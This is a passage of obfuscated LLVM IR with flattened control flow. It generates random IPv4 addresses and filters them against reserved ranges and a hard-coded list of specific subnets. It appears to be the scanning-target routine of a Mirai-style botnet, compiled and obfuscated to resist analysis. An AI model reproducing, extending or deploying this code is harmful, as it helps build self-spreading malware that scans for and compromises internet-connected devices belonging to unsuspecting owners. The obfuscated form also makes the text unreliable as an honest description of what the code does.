  %25 = zext i8 %24 to i32
  %26 = call i32 (i8*, i8*, ...) @szprintf(i8* %17, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i32 0, i32 0), i32 %19, i32 %21, i32 %23, i32 %25)
  %27 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %28 = call i32 @inet_addr(i8* %27) #2
  store i32 %28, i32* %1, align 4
  store i32 1577445099, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = call i32 @rand() #2
  %31 = srem i32 %30, 255
  %32 = trunc i32 %31 to i8
  store i8 %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %33 = call i32 @rand() #2
  %34 = srem i32 %33, 255
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %36 = call i32 @rand() #2
  %37 = srem i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %39 = call i32 @rand() #2
  %40 = srem i32 %39, 255
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i32 98897439, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 0
  %46 = select i1 %45, i32 -1383318438, i32 554391081
  store i32 %46, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 10
  %51 = select i1 %50, i32 -1383318438, i32 -1860406887
  store i32 %51, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 100
  %56 = select i1 %55, i32 1317117451, i32 -1188493063
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 64
  %61 = select i1 %60, i32 1629079343, i32 -1188493063
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 127
  %66 = select i1 %65, i32 -1383318438, i32 -1188493063
  store i32 %66, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 127
  %71 = select i1 %70, i32 -1383318438, i32 367287959
  store i32 %71, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 %74, 169
  %76 = select i1 %75, i32 -304028187, i32 1427345528
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 254
  %81 = select i1 %80, i32 -1383318438, i32 1427345528
  store i32 %81, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 172
  %86 = select i1 %85, i32 1397667163, i32 676248865
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %89 = zext i8 %88 to i32
  %90 = icmp sle i32 %89, 16
  %91 = select i1 %90, i32 -1204297099, i32 676248865
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %94 = zext i8 %93 to i32
  %95 = icmp sle i32 %94, 31
  %96 = select i1 %95, i32 -1383318438, i32 676248865
  store i32 %96, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 192
  %101 = select i1 %100, i32 1512162544, i32 -176051615
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 0
  %106 = select i1 %105, i32 -1546841343, i32 -176051615
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 2
  %111 = select i1 %110, i32 -1383318438, i32 -176051615
  store i32 %111, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 192
  %116 = select i1 %115, i32 -397469254, i32 -2130924902
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 88
  %121 = select i1 %120, i32 -2067022796, i32 -2130924902
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 99
  %126 = select i1 %125, i32 -1383318438, i32 -2130924902
  store i32 %126, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 192
  %131 = select i1 %130, i32 719272327, i32 -370301464
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 168
  %136 = select i1 %135, i32 -1383318438, i32 -370301464
  store i32 %136, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 198
  %141 = select i1 %140, i32 1840925090, i32 449274736
  store i32 %141, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  %143 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 18
  %146 = select i1 %145, i32 -1383318438, i32 2018465637
  store i32 %146, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 19
  %151 = select i1 %150, i32 -1383318438, i32 449274736
  store i32 %151, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 198
  %156 = select i1 %155, i32 911089537, i32 1741921928
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 51
  %161 = select i1 %160, i32 2116975999, i32 1741921928
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 %164, 100
  %166 = select i1 %165, i32 -1383318438, i32 1741921928
  store i32 %166, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 203
  %171 = select i1 %170, i32 -294090897, i32 -142529362
  store i32 %171, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %174 = zext i8 %173 to i32
  %175 = icmp eq i32 %174, 0
  %176 = select i1 %175, i32 -1560005182, i32 -142529362
  store i32 %176, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 113
  %181 = select i1 %180, i32 -1383318438, i32 -142529362
  store i32 %181, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 188
  %186 = select i1 %185, i32 641835496, i32 293570007
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 209
  %191 = select i1 %190, i32 456896639, i32 293570007
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 52
  %196 = select i1 %195, i32 -1383318438, i32 293570007
  store i32 %196, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %199 = zext i8 %198 to i32
  %200 = icmp eq i32 %199, 188
  %201 = select i1 %200, i32 1619432114, i32 1838285739
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 209
  %206 = select i1 %205, i32 -2096824717, i32 1838285739
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 49
  %211 = select i1 %210, i32 -1383318438, i32 1838285739
  store i32 %211, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %214 = zext i8 %213 to i32
  %215 = icmp eq i32 %214, 185
  %216 = select i1 %215, i32 1417248875, i32 272661365
  store i32 %216, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 62
  %221 = select i1 %220, i32 852399126, i32 272661365
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 190
  %226 = select i1 %225, i32 -1383318438, i32 272661365
  store i32 %226, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 185
  %231 = select i1 %230, i32 -1727081816, i32 -686526401
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 62
  %236 = select i1 %235, i32 -601022041, i32 -686526401
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 189
  %241 = select i1 %240, i32 -1383318438, i32 -686526401
  store i32 %241, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %244 = zext i8 %243 to i32
  %245 = icmp eq i32 %244, 185
  %246 = select i1 %245, i32 1003246388, i32 802618434
  store i32 %246, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  %248 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 62
  %251 = select i1 %250, i32 -2116362706, i32 802618434
  store i32 %251, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 188
  %256 = select i1 %255, i32 -1383318438, i32 802618434
  store i32 %256, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %259 = zext i8 %258 to i32
  %260 = icmp eq i32 %259, 185
  %261 = select i1 %260, i32 1896282365, i32 725913901
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 61
  %266 = select i1 %265, i32 1146017107, i32 725913901
  store i32 %266, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 137
  %271 = select i1 %270, i32 -1383318438, i32 725913901
  store i32 %271, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 185
  %276 = select i1 %275, i32 460880712, i32 1295308295
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %279 = zext i8 %278 to i32
  %280 = icmp eq i32 %279, 61
  %281 = select i1 %280, i32 560066687, i32 1295308295
  store i32 %281, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %284 = zext i8 %283 to i32
  %285 = icmp eq i32 %284, 136
  %286 = select i1 %285, i32 -1383318438, i32 1295308295
  store i32 %286, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %289 = zext i8 %288 to i32
  %290 = icmp eq i32 %289, 185
  %291 = select i1 %290, i32 -705392772, i32 1699061175
  store i32 %291, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %294 = zext i8 %293 to i32
  %295 = icmp eq i32 %294, 11
  %296 = select i1 %295, i32 -545951619, i32 1699061175
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %299 = zext i8 %298 to i32
  %300 = icmp eq i32 %299, 147
  %301 = select i1 %300, i32 -1383318438, i32 1699061175
  store i32 %301, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp eq i32 %304, 185
  %306 = select i1 %305, i32 1016203538, i32 -677275399
  store i32 %306, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  %308 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %309 = zext i8 %308 to i32
  %310 = icmp eq i32 %309, 11
  %311 = select i1 %310, i32 -1049199010, i32 -677275399
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %314 = zext i8 %313 to i32
  %315 = icmp eq i32 %314, 146
  %316 = select i1 %315, i32 -1383318438, i32 -677275399
  store i32 %316, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %319 = zext i8 %318 to i32
  %320 = icmp eq i32 %319, 185
  %321 = select i1 %320, i32 1978352591, i32 1482562186
  store i32 %321, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %324 = zext i8 %323 to i32
  %325 = icmp eq i32 %324, 11
  %326 = select i1 %325, i32 -252338759, i32 1482562186
  store i32 %326, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %329 = zext i8 %328 to i32
  %330 = icmp eq i32 %329, 145
  %331 = select i1 %330, i32 -1383318438, i32 1482562186
  store i32 %331, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %334 = zext i8 %333 to i32
  %335 = icmp eq i32 %334, 63
  %336 = select i1 %335, i32 -1736401992, i32 1790291591
  store i32 %336, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %339 = zext i8 %338 to i32
  %340 = icmp eq i32 %339, 141
  %341 = select i1 %340, i32 -1140982399, i32 1790291591
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %344 = zext i8 %343 to i32
  %345 = icmp eq i32 %344, 241
  %346 = select i1 %345, i32 -1383318438, i32 1790291591
  store i32 %346, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %349 = zext i8 %348 to i32
  %350 = icmp eq i32 %349, 69
  %351 = select i1 %350, i32 171974191, i32 169470472
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %354 = zext i8 %353 to i32
  %355 = icmp eq i32 %354, 30
  %356 = select i1 %355, i32 51418874, i32 169470472
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %359 = zext i8 %358 to i32
  %360 = icmp eq i32 %359, 192
  %361 = select i1 %360, i32 -1383318438, i32 169470472
  store i32 %361, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 69
  %366 = select i1 %365, i32 1720817343, i32 -181003831
  store i32 %366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %369 = zext i8 %368 to i32
  %370 = icmp eq i32 %369, 30
  %371 = select i1 %370, i32 -112872553, i32 -181003831
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 244
  %376 = select i1 %375, i32 -1383318438, i32 -181003831
  store i32 %376, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %379 = zext i8 %378 to i32
  %380 = icmp eq i32 %379, 69
  %381 = select i1 %380, i32 -2101912349, i32 924719495
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %384 = zext i8 %383 to i32
  %385 = icmp eq i32 %384, 197
  %386 = select i1 %385, i32 1239752045, i32 924719495
  store i32 %386, i32* %switchVar
  br label %loopEnd

; <label>:387:                                    ; preds = %loopEntry
  %388 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %389 = zext i8 %388 to i32
  %390 = icmp eq i32 %389, 128
  %391 = select i1 %390, i32 -1383318438, i32 924719495
  store i32 %391, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  %393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %394 = zext i8 %393 to i32
  %395 = icmp eq i32 %394, 162
  %396 = select i1 %395, i32 -1026292314, i32 -587138478
  store i32 %396, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %399 = zext i8 %398 to i32
  %400 = icmp eq i32 %399, 251
  %401 = select i1 %400, i32 1192931700, i32 -587138478
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %404 = zext i8 %403 to i32
  %405 = icmp eq i32 %404, 120
  %406 = select i1 %405, i32 -1383318438, i32 -587138478
  store i32 %406, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %409 = zext i8 %408 to i32
  %410 = icmp eq i32 %409, 173
  %411 = select i1 %410, i32 2035927624, i32 493786704
  store i32 %411, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %414 = zext i8 %413 to i32
  %415 = icmp eq i32 %414, 208
  %416 = select i1 %415, i32 -2064084927, i32 493786704
  store i32 %416, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %419 = zext i8 %418 to i32
  %420 = icmp eq i32 %419, 128
  %421 = select i1 %420, i32 -1383318438, i32 493786704
  store i32 %421, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:422:                                    ; preds = %loopEntry
  %423 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %424 = zext i8 %423 to i32
  %425 = icmp eq i32 %424, 173
  %426 = select i1 %425, i32 -1735370332, i32 -501797600
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %429 = zext i8 %428 to i32
  %430 = icmp eq i32 %429, 208
  %431 = select i1 %430, i32 167264095, i32 -501797600
  store i32 %431, i32* %switchVar
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  %433 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %434 = zext i8 %433 to i32
  %435 = icmp eq i32 %434, 180
  %436 = select i1 %435, i32 -1383318438, i32 -501797600
  store i32 %436, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %439 = zext i8 %438 to i32
  %440 = icmp eq i32 %439, 173
  %441 = select i1 %440, i32 684739401, i32 1126082424
  store i32 %441, i32* %switchVar
  br label %loopEnd

; <label>:442:                                    ; preds = %loopEntry
  %443 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %444 = zext i8 %443 to i32
  %445 = icmp eq i32 %444, 208
  %446 = select i1 %445, i32 -104754497, i32 1126082424
  store i32 %446, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
